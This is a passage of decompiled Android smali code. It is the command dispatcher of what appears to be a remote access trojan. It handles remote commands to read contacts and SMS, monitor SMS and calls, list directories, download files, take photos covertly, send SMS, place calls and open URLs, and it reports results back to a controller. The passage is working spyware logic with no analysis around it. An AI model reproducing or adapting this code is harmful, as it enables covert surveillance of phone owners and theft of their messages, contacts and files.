    .line 102
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->callMonitor:Lmy/app/Library/CallMonitor;

    invoke-virtual {v2}, Lmy/app/Library/CallMonitor;->stop()V

    .line 103
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->callMonitor:Lmy/app/Library/CallMonitor;

    .line 104
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Call monitoring stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 106
    :cond_9
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_CONTACTS:S

    if-ne v2, v4, :cond_a

    .line 108
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Contacts request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 109
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v4}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-static {v2, v0, v4}, Lmy/app/Library/ContactsLister;->listContacts(Lmy/app/client/ClientListener;I[B)Z

    move-result v2

    if-nez v2, :cond_1

    .line 110
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "No contact to return"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 112
    :cond_a
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->LIST_DIR:S

    if-ne v2, v4, :cond_b

    .line 114
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "List directory request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 115
    new-instance v14, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    invoke-direct {v14, v2}, Ljava/lang/String;-><init>([B)V

    .line 116
    .local v14, "file":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move/from16 v0, p3

    invoke-static {v2, v0, v14}, Lmy/app/Library/DirLister;->listDir(Lmy/app/client/ClientListener;ILjava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_1

    .line 117
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Directory: "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, " not found"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 119
    .end local v14    # "file":Ljava/lang/String;
    :cond_b
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_FILE:S

    if-ne v2, v4, :cond_c

    .line 121
    new-instance v14, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    invoke-direct {v14, v2}, Ljava/lang/String;-><init>([B)V

    .line 122
    .restart local v14    # "file":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Download file "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, " request received"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 123
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/FileDownloader;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-direct {v4, v6}, Lmy/app/Library/FileDownloader;-><init>(Lmy/app/client/ClientListener;)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->fileDownloader:Lmy/app/Library/FileDownloader;

    .line 124
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->fileDownloader:Lmy/app/Library/FileDownloader;

    move/from16 v0, p3

    invoke-virtual {v2, v14, v0}, Lmy/app/Library/FileDownloader;->downloadFile(Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 126
    .end local v14    # "file":Ljava/lang/String;
    :cond_c
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_PICTURE:S

    if-ne v2, v4, :cond_e

    .line 128
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Photo picture request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 129
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    instance-of v2, v2, Lmy/app/client/Client;

    if-eqz v2, :cond_d

    .line 130
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Photo requested from a service (it will probably not work)"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    .line 131
    :cond_d
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/PhotoTaker;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move/from16 v0, p3

    invoke-direct {v4, v6, v0}, Lmy/app/Library/PhotoTaker;-><init>(Lmy/app/client/ClientListener;I)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->photoTaker:Lmy/app/Library/PhotoTaker;

    .line 132
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->photoTaker:Lmy/app/Library/PhotoTaker;

    invoke-virtual {v2}, Lmy/app/Library/PhotoTaker;->takePhoto()Z

    move-result v2

    if-nez v2, :cond_1

    .line 133
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Something went wrong while taking the picture"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 135
    :cond_e
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->DO_TOAST:S

    if-ne v2, v4, :cond_f

    .line 137
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v6, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([B)V

    const/4 v7, 0x1

    invoke-static {v4, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v4

    iput-object v4, v2, Lmy/app/client/ClientListener;->toast:Landroid/widget/Toast;

    .line 138
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->toast:Landroid/widget/Toast;

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    goto/16 :goto_0

    .line 140
    :cond_f
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->SEND_SMS:S

    if-ne v2, v4, :cond_11

    .line 142
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    invoke-static {v2}, Lutils/EncoderHelper;->decodeHashMap([B)Ljava/util/HashMap;

    move-result-object v16

    .line 143
    .local v16, "information":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    const-string v2, "number"

    move-object/from16 v0, v16

    invoke-interface {v0, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    .line 144
    .local v3, "num":Ljava/lang/String;
    const-string v2, "body"

    move-object/from16 v0, v16

    invoke-interface {v0, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    .line 145
    .local v5, "text":Ljava/lang/String;
    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    array-length v2, v2

    const/16 v4, 0xa7

    if-ge v2, v4, :cond_10

    .line 146
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    const/4 v4, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 152
    :goto_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "SMS sent"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 149
    :cond_10
    move-object/from16 v0, p0

    invoke-direct {v0, v5}, Lmy/app/client/ProcessCommand;->MessageDecoupator(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v9

    .line 150
    .local v9, "multipleMsg":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v6

    const/4 v8, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    move-object v7, v3

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    goto :goto_1

    .line 154
    .end local v3    # "num":Ljava/lang/String;
    .end local v5    # "text":Ljava/lang/String;
    .end local v9    # "multipleMsg":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v16    # "information":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    :cond_11
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GIVE_CALL:S

    if-ne v2, v4, :cond_12

    .line 156
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "tel:"

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v6}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 157
    .local v18, "uri":Ljava/lang/String;
    new-instance v2, Landroid/content/Intent;

    const-string v4, "android.intent.action.CALL"

    invoke-static/range {v18 .. v18}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-direct {v2, v4, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    move-object/from16 v0, p0

    iput-object v2, v0, Lmy/app/client/ProcessCommand;->intent:Landroid/content/Intent;

    .line 158
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->intent:Landroid/content/Intent;

    const/high16 v4, 0x10000000

    invoke-virtual {v2, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 159
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->intent:Landroid/content/Intent;

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 161
    .end local v18    # "uri":Ljava/lang/String;
    :cond_12
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_SMS:S

    if-ne v2, v4, :cond_13

    .line 163
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "SMS list request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 164
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v4}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-static {v2, v0, v4}, Lmy/app/Library/SMSLister;->listSMS(Lmy/app/client/ClientListener;I[B)Z

    move-result v2

    if-nez v2, :cond_1

    .line 165
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "No SMS match for filter"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 167
    :cond_13
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->MONITOR_SMS:S

    if-ne v2, v4, :cond_14

    .line 169
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Start SMS monitoring"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 170
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/SMSMonitor;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v7

    move/from16 v0, p3

    invoke-direct {v4, v6, v0, v7}, Lmy/app/Library/SMSMonitor;-><init>(Lmy/app/client/ClientListener;I[B)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->smsMonitor:Lmy/app/Library/SMSMonitor;

    goto/16 :goto_0

    .line 172
    :cond_14
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_MONITOR_SMS:S

    if-ne v2, v4, :cond_15

    .line 174
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->smsMonitor:Lmy/app/Library/SMSMonitor;

    invoke-virtual {v2}, Lmy/app/Library/SMSMonitor;->stop()V

    .line 175
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->smsMonitor:Lmy/app/Library/SMSMonitor;

    .line 176
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "SMS monitoring stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 178
    :cond_15
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    const/16 v4, 0x15

    if-ne v2, v4, :cond_16

    .line 180
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual/range {p0 .. p0}, Lmy/app/client/ProcessCommand;->loadPreferences()LPacket/PreferencePacket;

    move-result-object v4

    invoke-virtual {v4}, LPacket/PreferencePacket;->build()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-virtual {v2, v0, v4}, Lmy/app/client/ClientListener;->handleData(I[B)V

    goto/16 :goto_0

    .line 182
    :cond_16
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    const/16 v4, 0x14

    if-ne v2, v4, :cond_17

    .line 184
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lmy/app/client/ProcessCommand;->savePreferences([B)V

    .line 185
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual {v2}, Lmy/app/client/ClientListener;->loadPreferences()V

    goto/16 :goto_0

    .line 187
    :cond_17
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_ADV_INFORMATIONS:S

    if-ne v2, v4, :cond_18

    .line 188
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/AdvancedSystemInfo;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move/from16 v0, p3

    invoke-direct {v4, v6, v0}, Lmy/app/Library/AdvancedSystemInfo;-><init>(Lmy/app/client/ClientListener;I)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->advancedInfos:Lmy/app/Library/AdvancedSystemInfo;

    .line 189
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->advancedInfos:Lmy/app/Library/AdvancedSystemInfo;

    invoke-virtual {v2}, Lmy/app/Library/AdvancedSystemInfo;->getInfos()V

    goto/16 :goto_0

    .line 191
    :cond_18
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->OPEN_BROWSER:S

    if-ne v2, v4, :cond_19

    .line 192
    new-instance v19, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    move-object/from16 v0, v19

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    .line 193
    .local v19, "url":Ljava/lang/String;
    new-instance v15, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-static/range {v19 .. v19}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    invoke-direct {v15, v2, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 194
    .local v15, "i":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v15, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 195
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual {v2, v15}, Lmy/app/client/ClientListener;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 197
    .end local v15    # "i":Landroid/content/Intent;
    .end local v19    # "url":Ljava/lang/String;
    :cond_19
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->DO_VIBRATE:S

    if-ne v2, v4, :cond_1a

    .line 198
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "vibrator"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v20

    check-cast v20, Landroid/os/Vibrator;

    .line 199
    .local v20, "v":Landroid/os/Vibrator;
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->getLong()J

    move-result-wide v12

    .line 200
    .local v12, "duration":J
    move-object/from16 v0, v20

    invoke-virtual {v0, v12, v13}, Landroid/os/Vibrator;->vibrate(J)V

    goto/16 :goto_0

    .line 203
    .end local v12    # "duration":J
    .end local v20    # "v":Landroid/os/Vibrator;
    :cond_1a
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    const/4 v4, 0x5

    if-ne v2, v4, :cond_1b

    .line 204
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual {v2}, Lmy/app/client/ClientListener;->onDestroy()V

    goto/16 :goto_0

    .line 207
    :cond_1b
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Command: "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-short v6, v0, Lmy/app/client/ProcessCommand;->commande:S

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, " unknown"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0
.end method
